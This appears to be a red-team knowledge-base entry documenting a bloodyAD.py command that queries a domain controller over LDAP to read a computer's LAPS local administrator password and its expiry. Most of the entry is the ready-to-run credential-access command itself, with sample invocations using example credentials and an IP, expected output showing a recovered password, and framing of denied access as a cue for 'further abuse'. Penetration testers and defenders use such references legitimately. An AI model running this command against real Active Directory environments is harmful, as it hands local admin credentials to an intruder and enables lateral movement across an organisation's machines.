---
id: 8a593891-4d38-4cee-a13e-fa19f4f90856
name: bloodyAD Get Object Attributes for LAPS Password
type: command
executor: bash
data: >-
  bloodyAD.py -u $_USERNAME -d $_DOMAIN -p $_PASSWORD --host $_DC_IP
  getObjectAttributes $_COMPUTER_NAME ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
output: null
created_at: '2023-04-06T03:56:06.929953+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - active-directory
  - laps
  - credential-access
verified: true
validated: true
---

# bloodyAD Get Object Attributes for LAPS Password

## Command

```bash
bloodyAD.py -u $_USERNAME -d $_DOMAIN -p $_PASSWORD --host $_DC_IP getObjectAttributes $_COMPUTER_NAME ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
```

## Description

This command uses the bloodyAD.py tool (a Python script for AD enumeration and abuse) to query specific attributes on an AD computer object, targeting the LAPS password (ms-Mcs-AdmPwd) and its expiration time. It is used when direct PowerShell access is limited or to bypass certain restrictions by leveraging LDAP queries over the network.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_USERNAME | Domain username for authentication | Yes |
| -d $_DOMAIN | Target domain name | Yes |
| -p $_PASSWORD | Password for the username | Yes |
| --host $_DC_IP | IP address of the Domain Controller | Yes |
| getObjectAttributes $_COMPUTER_NAME | Subcommand to get attributes for the specified computer object (e.g., LAPS_PC$) | Yes |
| ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | AD attributes to retrieve (LAPS password and expiration) | Yes |

## Examples

### Basic Usage

```bash
bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
```

### Advanced Usage

```bash
bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 -v getObjectAttributes LAPS_PC$ ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,description
```

(Adds verbose output and an extra attribute like description.)

## Expected Output

Successful execution returns the queried attributes, such as:

```
ms-Mcs-AdmPwd: SuperSecurePass123!
ms-Mcs-AdmPwdExpirationTime: 2023-10-01T12:00:00Z
```

If access is denied due to ACLs, it will error with a permission message, indicating the need for further abuse.

## Related

- [[procedures/Abusing-Active-Directory-ACLs-ACEs-to-Retrieve-LAPS-Passwords]]
- [[tools/BloodHound]]
